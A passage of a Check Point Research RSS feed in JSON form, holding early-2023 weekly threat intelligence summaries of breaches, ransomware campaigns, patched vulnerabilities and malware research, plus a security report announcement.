process.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point IPS provides protection against this threat </em><em>(VMWare OpenSLP Heap Buffer Overflow (CVE-2019-5544; CVE-2021-21974))</em></p>\n<ul>\n<li>Social media platform Reddit <a href=\"https://www.reddit.com/r/reddit/comments/10y427y/we_had_a_security_incident_heres_what_we_know/\">suffered</a> a security breach, after an employee fell victim to a phishing attack. According to the company\u2019s statement, while internal documents and source code were stolen, user information and credentials have not been impacted.</li>\n<li>One of Israel\u2019s leading universities, \u2018The Israel Institute of Technology\u2019 (Technion), has been <a href=\"https://www.databreaches.net/technion-university-hacked-and-locked-previously-unknown-attackers-demand-80-btc/\">targeted</a> by a ransomware attack, forcing it to shut down its network and postpone final exams to the upcoming semester. Suspicions were raised that the attack might be politically or personally motivated, as the perpetrators are a previously unknown group and the ransom note included nonstandard messaging.</li>\n<li>American grocery delivery company \u2018Weee!\u2019 has <a href=\"https://www.sayweee.com/en/view/february-2023-data-breach\">confirmed</a> that a security breach had caused disclosure of customer information, after a database including more than a million of the company\u2019s customers\u2019 accounts had been <a href=\"https://techcrunch.com/2023/02/10/weee-hacked/\">leaked</a> on online forums.</li>\n<li>US and South Korean agencies <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa23-040a\">warn</a> of recent ransomware efforts originating from North Korea. According to the report, North Korean government-sponsored ransomware attacks, specifically targeting the healthcare industry, are used to generate funds for further malicious activity.</li>\n<li>Canada\u2019s largest book retailer, Indigo, has been <a href=\"https://www.ctvnews.ca/business/indigo-offers-fresh-details-on-cyberattack-on-bookstore-s-website-payment-system-1.6268652\">forced</a> to shut own its website and all online operations due to a cyberattack. It is still unknown whether customer information has been compromised.</li>\n</ul>\n<p><strong>VULNERABILITIES AND PATCHES</strong></p>\n<ul>\n<li>\u2018GoAnywhere\u2019 Managed File Transfer platform has released version 7.1.2 to <a href=\"https://www.securityweek.com/patch-released-for-actively-exploited-goanywhere-mft-zero-day/\">address</a> CVE-2023-0669, a zero-day remote code execution vulnerability which has recently been widely exploited in the wild. The \u2018Cl0p\u2019 ransomware gang has <a href=\"https://www.bleepingcomputer.com/news/security/clop-ransomware-claims-it-breached-130-orgs-using-goanywhere-zero-day/\">assumed</a> responsibility for exploiting the vulnerability, and claims to have abused it to exfiltrate data from more than 130 organizations.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point IPS provides protection against this threat </em><em>(GoAnywhere MFT Insecure Deserialization)</em></p>\n<ul>\n<li>The OpenSSL project has <a href=\"https://www.openssl.org/news/secadv/20230207.txt\">published</a> a security advisory which contains fixes for 8 vulnerabilities across multiple versions of OpenSSL. One of the vulnerabilities is considered to be of High severity, as it allows a remote attacker to read memory content and cause denial of service.</li>\n<li>Android has <a href=\"https://source.android.com/docs/security/bulletin/2023-02-01\">released</a> its February security patch. More than 20 vulnerabilities were fixed in the patch, some of which could lead to remote code execution.</li>\n</ul>\n<p><strong>THREAT </strong><strong>INTELLIGENCE REPORT</strong></p>\n<ul>\n<li>Check Point has <a href=\"https://research.checkpoint.com/2023/2023-security-report-cyberattacks-reach-an-all-time-high-in-response-to-geo-political-conflict-and-the-rise-of-disruption-and-destruction-malware/\">published</a> its 2023 Security Report, which reviews significant developments in the cyber landscape during the past year. Among the trends analyzed by Check Point are the shift of ransomware groups to data exfiltration and extortion, the increasing threat of nation-state backed hacktivism, and the observed rise in attacks targeting cloud-based networks in 2022.</li>\n<li>Check Point\u2019s researchers <a href=\"https://blog.checkpoint.com/2023/02/07/cybercriminals-bypass-chatgpt-restrictions-to-generate-malicious-content/\">found</a> that threat actors are working their way around ChatGPT\u2019s restrictions to create malicious content and to improve the code of a basic Infostealer malware from 2019.</li>\n<li>Researchers have analyzed multiple campaigns using malicious packages in attempted supply-chain attacks. One Pypi (Python) campaign <a href=\"https://blog.phylum.io/phylum-discovers-revived-crypto-wallet-address-replacement-attack\">created</a> over 450 crypto-related packages that would replace cryptocurrency wallet addresses, while another <a href=\"https://www.fortinet.com/blog/threat-research/supply-chain-attack-via-new-malicious-python-packages-by-malware-author-core1337\">registered</a> 5 packages that deliver credential-stealing malware. Also observed was an npm (Java) campaign, which <a href=\"https://www.reversinglabs.com/blog/open-source-malware-sows-havoc-on-supply-chain\">delivered</a> a remote-access Trojan.</li>\n<li>New information-stealer malware used by the Russian-affiliated Nodaria APT group has been <a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/nodaria-ukraine-infostealer\">detected</a>. The malware, which was observed in a campaign targeting Ukraine, has sophisticated information gathering capabilities as well as multiple evasion techniques.</li>\n<li>Researchers have <a href=\"https://www.eff.org/deeplinks/2023/02/uncle-sow-dark-caracal-latin-america\">analyzed</a> a new campaign by mercenary APT group Dark Caracal. The campaign affected more than a dozen countries in Latin America, successfully infecting more than 700 hosts. The payload is a remote access Trojan with various spyware and remote control capabilities.</li>\n<li>A new APT group dubbed \u2018NewsPenguin\u2019 has been <a href=\"https://blogs.blackberry.com/en/2023/02/newspenguin-a-previously-unknown-threat-actor-targets-pakistan-with-advanced-espionage-tool\">discovered</a>. The group has been targeting organizations in Pakistan using a sophisticated spyware tool. The payload was delivered using spear-phishing emails related to an expo in Pakistan, targeting the expo\u2019s visitors.</li>\n</ul>\n<p>The post <a href=\"https://research.checkpoint.com/2023/13th-february-threat-intelligence-report/\" rel=\"nofollow\">13th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "2022 in Cybersecurity",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "2022 in Cybersecurity"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/2022-in-cybersecurity/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/2022-in-cybersecurity/",
            "authors": [
                {
                    "name": "etal"
                }
            ],
            "author": "etal",
            "author_detail": {
                "name": "etal"
            },
            "published": "Fri, 10 Feb 2023 03:29:19 +0000",
            "published_parsed": [
                2023,
                2,
                10,
                3,
                29,
                19,
                4,
                41,
                0
            ],
            "tags": [
                {
                    "term": "CPRadio",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27363",
            "guidislink": false,
            "summary": "<p>The post <a href=\"https://research.checkpoint.com/2023/2022-in-cybersecurity/\" rel=\"nofollow\">2022 in Cybersecurity</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>The post <a href=\"https://research.checkpoint.com/2023/2022-in-cybersecurity/\" rel=\"nofollow\">2022 in Cybersecurity</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<pre class=\"wp-block-code\"><code>\nIn 2022, government APTs wiped out entire computer systems, hackers turned good software evil, and ransomware evolved into something entirely new. In this episode we'll review the biggest stories, most important trends, and cutting insights from the last year in cybersecurity.\n</code></pre>\n\n\n\n\n<p>The post <a href=\"https://research.checkpoint.com/2023/2022-in-cybersecurity/\" rel=\"nofollow\">2022 in Cybersecurity</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "2023 Security Report: Cyberattacks reach an all-time high in response to geo-political conflict, and the rise of \u2018disruption and destruction\u2019 malware",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "2023 Security Report: Cyberattacks reach an all-time high in response to geo-political conflict, and the rise of \u2018disruption and destruction\u2019 malware"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/2023-security-report-cyberattacks-reach-an-all-time-high-in-response-to-geo-political-conflict-and-the-rise-of-disruption-and-destruction-malware/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/2023-security-report-cyberattacks-reach-an-all-time-high-in-response-to-geo-political-conflict-and-the-rise-of-disruption-and-destruction-malware/",
            "authors": [
                {
                    "name": "etal"
                }
            ],
            "author": "etal",
            "author_detail": {
                "name": "etal"
            },
            "published": "Wed, 08 Feb 2023 11:00:31 +0000",
            "published_parsed": [
                2023,
                2,
                8,
                11,
                0,
                31,
                2,
                39,
                0
            ],
            "tags": [
                {
                    "term": "Check Point Research Publications",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27346",
            "guidislink": false,
            "summary": "<p>The 2023 Security Report is reflecting on a chaotic year in cybersecurity. The report looks back on a tumultuous 2022, which saw cyberattacks reach an all-time high in response to the Russo-Ukrainian war. Education and Research remains the most targeted sector, but attacks on the healthcare sector registered a 74% increase year-on-year. According to the [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/2023-security-report-cyberattacks-reach-an-all-time-high-in-response-to-geo-political-conflict-and-the-rise-of-disruption-and-destruction-malware/\" rel=\"nofollow\">2023 Security Report: Cyberattacks reach an all-time high in response to geo-political conflict, and the rise of \u2018disruption and destruction\u2019 malware</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>The 2023 Security Report is reflecting on a chaotic year in cybersecurity. The report looks back on a tumultuous 2022, which saw cyberattacks reach an all-time high in response to the Russo-Ukrainian war. Education and Research remains the most targeted sector, but attacks on the healthcare sector registered a 74% increase year-on-year. According to the [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/2023-security-report-cyberattacks-reach-an-all-time-high-in-response-to-geo-political-conflict-and-the-rise-of-disruption-and-destruction-malware/\" rel=\"nofollow\">2023 Security Report: Cyberattacks reach an all-time high in response to geo-political conflict, and the rise of \u2018disruption and destruction\u2019 malware</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p>The 2023 Security Report is reflecting on a chaotic year in cybersecurity. The report looks back on a tumultuous 2022, which saw cyberattacks reach an all-time high in response to the Russo-Ukrainian war. Education and Research remains the most targeted sector, but attacks on the healthcare sector registered a 74% increase year-on-year.</p>\n\n\n\n<p>According to the report, cyberattacks have risen by 38% in 2022 compared to the previous year, with an average of 1,168 weekly attacks per organization being recorded. The report also highlights the role played by smaller and more agile hackers and ransomware groups in exploiting legitimate collaboration tools used in the hybrid workplace. From the rise of new ransomware variants to the <a href=\"https://blog.checkpoint.com/2022/10/03/new-hacktivism-model-trends-worldwide/\">spread of hacktivism in conflict areas in Eastern Europe and the Middle East</a>, the 2023 Security Report uncovers the trends and behaviors that defined the year.</p>\n\n\n\n<h1 class=\"wp-block-heading\"><a href=\"https://pages.checkpoint.com/cyber-security-report-2023.html\">Get exclusive access to the report</a></h1>\n\n\n\n<p><strong>Highlights of the 2023 Cyber Security Report include:</strong></p>\n\n\n\n<ul>\n<li><strong>Ransomware Extortion and </strong><strong>Unrestrained Wipers </strong>&#8211; Attribution of ransomware operations and tracking threat actors may become even harder, and existing protection mechanisms which are based on detecting encryption activity, could prove less effective. Instead, the focus will be more on data wiping and exfiltration detection.</li>\n\n\n\n<li><strong>Hacktivism </strong>&#8211; The boundaries between state cyber-operations and hacktivism have been blurred, as nation states acted with a degree of anonymity without fear of retaliation. Non-state affiliated hacktivist groups are better organized and more effective than ever before.</li>\n\n\n\n<li><strong>Cloud: Third Party Threat </strong>\u2013There has been a significant increase in the number of attacks on cloud-based networks per organization, which shot up by 48% in 2022 compared with 2021 indicating a shift for threat actors\u2019 preference to scan the IP range of cloud providers gaining easier access to sensitive information or critical services.</li>\n\n\n\n<li><strong>Weaponization of Legitimate Tools &#8211; </strong>To combat sophisticated cybersecurity solutions, threat actors are developing and perfecting their attack techniques, which increasingly rely less on the use of custom malware and shift instead to utilizing non-signature tools.</li>\n</ul>\n\n\n\n<p>One of the key takeaways from the report is that the widening cyber skills gap and the increasing complexity of distributed networks have created the perfect storm for cybercriminals.<br />The cloud migration trend has only made things worse, creating a wider attack surface for these malicious actors.</p>\n\n\n\n<p>The 2023 Cyber Security Report gives a detailed synopsis of the cyber-threat landscape and provides practical take-aways and recommendations to security professionals on how to prevent the next attack. Whether it\u2019s a ransomware attack, a data breach, a phishing attack or a supply chain attack \u2013 prevention is at reach!</p>\n\n\n\n<p>The report\u2019s findings are based on data drawn from Check Point\u2019s ThreatCloud Intelligence, derived between January and December 2022.</p>\n\n\n\n<p><strong>This year, the report is presented in 2 formats , a pdf. file to download, and an interactive online version&nbsp;</strong></p>\n\n\n\n<h1 class=\"wp-block-heading\"><a href=\"https://pages.checkpoint.com/cyber-security-report-2023.html\">Get exclusive access to the report</a></h1>\n<p>The post <a href=\"https://research.checkpoint.com/2023/2023-security-report-cyberattacks-reach-an-all-time-high-in-response-to-geo-political-conflict-and-the-rise-of-disruption-and-destruction-malware/\" rel=\"nofollow\">2023 Security Report: Cyberattacks reach an all-time high in response to geo-political conflict, and the rise of \u2018disruption and destruction\u2019 malware</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "6th February \u2013 Threat Intelligence Report",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "6th February \u2013 Threat Intelligence Report"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/6th-february-threat-intelligence-report/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/6th-february-threat-intelligence-report/",
            "authors": [
                {
                    "name": "hagarb"
                }
            ],
            "author": "hagarb",
            "author_detail": {
                "name": "hagarb"
            },
            "published": "Mon, 06 Feb 2023 16:07:13 +0000",
            "published_parsed": [
                2023,
                2,
                6,
                16,
                7,
                13,
                0,
                37,
                0
            ],
            "tags": [
                {
                    "term": "Global Cyber Attack Reports",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27348",
            "guidislink": false,
            "summary": "<p>For the latest discoveries in cyber research for the week of 6th February, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHE Check Point Research has flagged the Dingo crypto Token, with a market cap of $10,941,525 as a scam. The threat actors behind the token added a backdoor function in its smart contract, to [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/6th-february-threat-intelligence-report/\" rel=\"nofollow\">6th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>For the latest discoveries in cyber research for the week of 6th February, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHE Check Point Research has flagged the Dingo crypto Token, with a market cap of $10,941,525 as a scam. The threat actors behind the token added a backdoor function in its smart contract, to [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/6th-february-threat-intelligence-report/\" rel=\"nofollow\">6th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p>For the latest discoveries in cyber research for the week of 6th February, please download our <a href=\"https://research.checkpoint.com/wp-content/uploads/2023/02/Threat_Intelligence_News_2023-02-06-2.pdf\">Threat_Intelligence Bulletin</a></p>\n<p><strong>TOP ATTACKS AND BREACHE</strong></p>\n<ul>\n<li>Check Point Research has <a href=\"https://blog.checkpoint.com/2023/02/02/dingo-token-ranking-is-774-with-a-live-market-cap-of-10941525-usd-is-a-scam/\">flagged</a> the Dingo crypto Token, with a market cap of $10,941,525 as a scam. The threat actors behind the token added a backdoor function in its smart contract, to manipulate the fee. Specifically, they used the &#8220;setTaxFeePercent&#8221; function within the token\u2019s smart contract code to manipulate the buying and selling fees to an alarming 99%. The function has already been used 47 times, and investors of Dingo Token can potentially risk losing all their funds.</li>\n<li>Google Fi, US telecommunications and mobile internet service, <a href=\"https://www.pcmag.com/news/google-fi-customers-caught-up-in-t-mobile-data-breach\">has announced</a> that data of its customers was breached as part of the T-Mobile data breach, exposing more than 37M customer records including phone numbers, SIM serial card numbers and service plan details.</li>\n<li>KillNet, a pro-Russian hacktivists group, <a href=\"https://healthitsecurity.com/news/hc3-killnet-hacktivist-group-uses-ddos-cyberattacks-to-target-healthcare\">has launched</a> a wide scale operation against the US healthcare sector with multiple DDoS attacks.</li>\n<li>ION Group, financial software company in the UK, <a href=\"https://www.bankinfosecurity.com/ransomware-hit-on-ion-group-delays-eu-derivatives-trades-a-21077\">has been</a> a victim of ransomware attack conducted by the LockBit ransomware gang. The threat actors targeted the ION Cleared Derivatives, a division of ION Markets, which affected some of its services.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation and Harmony Endpoint provide protection against this threat </em><em>(Ransomware.Win.Lockbit)</em></p>\n<ul>\n<li>An Iranian nation-state actor dubbed NEPTUNIUM <a href=\"https://blogs.microsoft.com/on-the-issues/2023/02/03/dtac-charlie-hebdo-hack-iran-neptunium/\">is behind</a> a data breach that exposed personal information of more than 200K of the French magazine Charlie Hebdo\u2019s clients. The threat actors offered the alleged leaked data for sale for 20 BTC (approximately $340,000).</li>\n<li>Tallahassee Memorial HealthCare, Florida, <a href=\"https://floridapolitics.com/archives/585686-tallahassee-memorial-hospital-victim-of-suspected-ransomware-attack/\">has been</a> victim of a cyber-attack that has disrupted its IT systems. While sources suspected a ransomware attack, the nature of this attack hasn\u2019t been confirmed.</li>\n<li>Arnold Clark, one of Europe\u2019s largest car retailer, <a href=\"https://www.securityweek.com/uk-car-retailer-arnold-clark-hit-by-ransomware/\">has been</a> a victim of a Play ransomware attack. The threat actors claim to have 467GB of data including names, contact details, dates of birth, vehicle information, passports or driver\u2019s licenses, national insurance numbers, and bank account details.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation provides protection against this threat </em><em>(Ransomware.Wins.PLAY.A)</em></p>\n<ul>\n<li>JD Sports, UK sportswear retailer, <a href=\"https://www.londonstockexchange.com/news-article/JD./cyber-security-incident-regarding-historic-orders/15815662\">has announced</a> a data breach that affected approximately 10M clients. The alleged leaked data consists of clients\u2019 online orders placed between November 2018 and October 2020, including full names, emails, phone numbers, billing details, delivery addresses, and more.</li>\n<li>Nantucket US Public Schools <a href=\"https://edition.cnn.com/2023/01/31/politics/ransomware-attack-schools-nantucket/index.html\">has been</a> a victim of a ransomware attack that shut down all student and staff devices, as well as schools\u2019 security systems.</li>\n</ul>\n<p><strong>VULNERABILITIES AND PATCHES</strong></p>\n<ul>\n<li>VMware has <a href=\"https://www.vmware.com/security/advisories/VMSA-2023-0001.html\">patched</a> vulnerabilities affecting VMware vRealize Log Insight, which when chained together can allow remote code execution as root privileges.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point IPS provides protection against this threat </em><em>(VMware vRealize Log Insight Information Disclosure (CVE-2022-31711); VMware vRealize Log Insight Directory Traversal (CVE-2022-31706))</em></p>\n<ul>\n<li>The French Computer Emergency Response Team (CERT-FR) <a href=\"https://www.cert.ssi.gouv.fr/alerte/CERTFR-2023-ALE-015/\">has published</a> an alert warning of an actively exploited vulnerability (tracked as CVE-2021-21974) exploited to infect VMware ESXi servers with a new ESXiArgs ransomware campaign. The attack has so far <a href=\"https://www.bleepingcomputer.com/news/security/massive-esxiargs-ransomware-attack-targets-vmware-esxi-servers-worldwide/\">affected</a> thousands of virtual machines, a third of which are hosted in France.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point IPS provides protection against this threat </em><em>(VMWare OpenSLP Heap Buffer Overflow (CVE-2019-5544))</em></p>\n<ul>\n<li>Atlassian <a href=\"https://confluence.atlassian.com/jira/jira-service-management-server-and-data-center-advisory-cve-2023-22501-1188786458.html\">has patched</a> a critical security flaw (tracked as CVE-2023-22501) in Jira Service Management Server and Data Center affecting versions 5.3.0 through 5.5.0. Successful exploitation might allow an attacker to impersonate another user and gain remote access to the affected system.</li>\n</ul>\n<p><strong>THREAT </strong><strong>INTELLIGENCE REPORT</strong></p>\n<ul>\n<li>Check Point Research <a href=\"https://research.checkpoint.com/2023/following-the-scent-of-trickgate-6-year-old-packer-used-to-deploy-the-most-wanted-malware/\">discusses</a> TrickGate, a shellcode-based packer offered as a service to help malware evade detection. Initially observed in July 2016, TrickGate has been used by top malware families, such as Cerber, Trickbot, Maze, Emotet, REvil, Cobalt Strike, AZORult, Formbook, AgentTesla and more.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation and Harmony Endpoint for Linux and Containers Runtime Security provide protection against this threat</em> <em>(Injector.Win.RunPE; Injector.Wins.Guanyin; Ransomware_Linux_Cerber_*; Ransomware_Linux_REvil_*; HackTool_Linux_CobaltStrike_*)</em></p>\n<ul>\n<li>Check Point Research <a href=\"https://blog.checkpoint.com/2023/02/01/the-rise-of-the-code-package-threat/\">exposed</a> two malicious code packages, Python-drgn and Bloxflip, distributed by threat actors, leveraging package repositories as a reliable and scalable malware distribution channel.</li>\n<li>Researchers <a href=\"https://www.fortinet.com/blog/threat-research/ransomware-roundup-trigona-ransomware\">have published</a> an analysis of the Trigona ransomware, first observed in October 2022 \\nd using double-extortion technique. The ransomware adds a \u201c._locked\u201d extension to their file name.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Harmony Endpoint provides protection against this threat </em><em>(ransomware.win.honey)</em></p>\n<ul>\n<li>The Iranian nation-state hacking group OilRig (aka APT34) <a href=\"https://www.trendmicro.com/en_us/research/23/b/new-apt34-malware-targets-the-middle-east.html\">targets</a> organizations in the Middle East using a new backdoor, capable of stealing users\u2019 credentials and abusing compromised mailbox accounts.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation provides protection against this threat </em><em>(APT.Wins.APT34)</em></p>\n<ul>\n<li>Researchers <a href=\"https://blog.cyble.com/2023/02/03/new-medusa-botnet-emerging-via-mirai-botnet-targeting-linux-users/\">have discovered</a> a new botnet, Medusa, spread via Mirai botnet targeting Linux machines. The Medusa botnet has the ability to launch DDoS attacks, bruteforce attacks, and ransomware attacks that encrypt files on compromised machines and add the \u201c.medusastealer\u201d extension to their file name.</li>\n</ul>\n<p>The post <a href=\"https://research.checkpoint.com/2023/6th-february-threat-intelligence-report/\" rel=\"nofollow\">6th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "30th January \u2013 Threat Intelligence Report",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "30th January \u2013 Threat Intelligence Report"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/30th-january-threat-intelligence-report/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/30th-january-threat-intelligence-report/",
            "authors": [
                {
                    "name": "dants"
                }
            ],
            "author": "dants",
            "author_detail": {
                "name": "dants"
            },
            "published": "Mon, 30 Jan 2023 15:37:36 +0000",
            "published_parsed": [
                2023,
                1,
                30,
                15,
                37,
                36,
                0,
                30,
                0
            ],
            "tags": [
                {
                    "term": "Global Cyber Attack Reports",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27341",
            "guidislink": false,
            "summary": "<p>For the latest discoveries in cyber research for the week of 30th January, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHE The ALPHV/BlackCat Ransomware group has allegedly hacked Westmont Hospitality Group, one of the largest privately-held hospitality businesses in the world. They claim to have obtained access to 262GB of the company&#8217;s data. Check [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/30th-january-threat-intelligence-report/\" rel=\"nofollow\">30th January \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>For the latest discoveries in cyber research for the week of 30th January, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHE The ALPHV/BlackCat Ransomware group has allegedly hacked Westmont Hospitality Group, one of the largest privately-held hospitality businesses in the world. They claim to have obtained access to 262GB of the company&#8217;s data. Check [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/30th-january-threat-intelligence-report/\" rel=\"nofollow\">30th January \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p>For the latest discoveries in cyber research for the week of 30th January, please download our <a href=\"https://research.checkpoint.com/wp-content/uploads/2023/01/Threat_Intelligence_News_2023-01-30.pdf\">Threat_Intelligence Bulletin</a></p>\n<p><strong>TOP ATTACKS AND BREACHE</strong></p>\n<ul>\n<li>The ALPHV/BlackCat Ransomware group has allegedly <a href=\"https://thecyberexpress.com/alphv-blackcat-ransomware-westmont-hospitality/\">hacked</a> Westmont Hospitality Group, one of the largest privately-held hospitality businesses in the world. They claim to have obtained access to 262GB of the company&#8217;s data.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Harmony Endpoint and Threat Emulation provide protection against this threat </em><em>(Ransomware.Win.BlackCat; Ransomware_Linux_BlackCat)</em></p>\n<ul>\n<li>PLAY ransomware group has allegedly <a href=\"https://therecord.media/play-ransomware-group-claims-attack-on-arnold-clark-one-of-britains-largest-car-dealerships/\">acquired</a> sensitive personal information from Arnold Clark, a major car dealership in the United Kingdom. The compromised data is said to include National Insurance numbers, passport information, as well as contact details such as addresses and phone numbers.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation provides protection against this threat </em><em>(Ransomware.Win.TouchTrapFiles.A; Ransomware.Win.GenRansom.glsf.A; Ransomware.Win.FilesMovedOrOverwrites.A)</em></p>\n<ul>\n<li>The Ukrainian Computer Emergency Response Team (CERT-UA) concluded that the attacks on Ukrinform &#8211; Ukraine&#8217;s national news agency \u2013 earlier this month, were performed by the Russian military cyber-espionage group, Sandworm, using five different data-wiping malware strains &#8211; CaddyWiper, ZeroWipe, SDelete, AwfulShred and BidSwipe.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation provides protection against this threat </em><em>(Trojan.Wins.CaddyWiper.*)</em></p>\n<ul>\n<li>Threat actors <a href=\"https://www.bleepingcomputer.com/news/security/zacks-investment-research-data-breach-affects-820-000-clients/\">have breached</a> Zacks Investment Research and accessed personal information of 820,000 customers. Zacks discovered the unauthorized access at the end of 2022, and an internal investigation found that a threat actor gained access to the network between November 2021 and August 2022.</li>\n<li>Threat actors have <a href=\"https://therecord.media/target-says-data-sold-on-dark-web-is-outdated-likely-released-by-third-party/\">leaked</a> a database they claim belongs to TARGET that contains information on 800K customers. The threat actors claim that the data includes GST ID, names, addresses, transactions, and more. TARGET has denied the breach, saying the data being sold on the dark web is not current and that the information was not taken directly from its systems.</li>\n<li>Security researchers have been <a href=\"https://www.sentinelone.com/labs/dragonspark-attacks-evade-detection-with-sparkrat-and-golang-source-code-interpretation/\">observing</a> a series of attacks against East Asian organizations, referred to as &#8220;DragonSpark&#8221;. These attacks deploy the open-source malware &#8220;SparkRAT&#8221;, and malware that utilizes Golang source code interpretation to evade detection. The researchers determined that it is highly probable that the attacks are being orchestrated by a Chinese-speaking actor.</li>\n<li>Researchers <a href=\"https://unit42.paloaltonetworks.com/plugx-variants-in-usbs/\">have uncovered</a> a PlugX sample that employs sneaky methods to infect attached removable USB media devices in order to propagate the malware to additional systems.</li>\n</ul>\n<p><strong>VULNERABILITIES AND PATCHES</strong></p>\n<ul>\n<li>The Internet Systems Consortium (ISC) has <a href=\"https://www.cisa.gov/uscert/ncas/current-activity/2023/01/27/isc-releases-security-advisories-multiple-versions-bind-9\">released</a> security patches to address 4 high severity security vulnerabilities (CVE-2022-3094, CVE-2022-3488, CVE-2022-3736, and CVE-2022-3924) in the BIND DNS software suite that could lead to a DoS condition and system failures.</li>\n<li>Lexmark has <a href=\"https://publications.lexmark.com/publications/security-alerts/CVE-2023-23560.pdf\">released</a> a security firmware update to fix a severe vulnerability (tracked as CVE-2023-23560) that could enable remote code execution on more than 100 printer models. The security issue is a server-side request forgery (SSRF) in the Web Services feature of Lexmark devices.</li>\n<li>Proof of Concept exploit code has been <a href=\"https://github.com/akamai/akamai-security-research/tree/main/PoCs/CVE-2022-34689\">released</a> for a critical Windows CryptoAPI vulnerability that allows MD5-collision certificate spoofing (CVE-2022-34689).</li>\n</ul>\n<p><strong>THREAT </strong><strong>INTELLIGENCE REPORT</strong></p>\n<ul>\n<li>Check Point <a href=\"https://blog.checkpoint.com/2023/01/23/brand-phishing-report-q4-2022/\">has published</a> its Brand Phishing report for Q4 of 2022 that reveals some statistical changes in phishing campaigns. It seems that Technology was the most likely industry to be imitated by brand phishing in Q4 of 2022, followed by Shipping and Social Networks. Also, 20% of all brand phishing 